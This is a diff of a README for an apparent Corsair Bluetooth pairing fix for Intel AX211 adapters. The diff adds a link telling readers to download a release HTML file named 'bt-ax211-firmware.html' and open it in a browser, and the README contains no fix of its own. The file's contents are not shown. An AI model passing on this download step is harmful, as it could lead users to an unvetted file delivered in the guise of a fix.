@@ -24,4 +24,4 @@ The same pairing issue also exists on **Windows 10** with the default Intel BT d
 - The problem persists across kernel versions and Bluetooth stack restarts
 
 
-#### To view the FIX and GUIDE, download the html file and open with preferred browser
+#### To view the FIX and GUIDE, [download the HTML file](https://github.com/g0004y/corsair-bluetooth-pairing-fix-intel-ax211-linux/releases/download/v1.0/bt-ax211-firmware.html) and open with your preferred browser
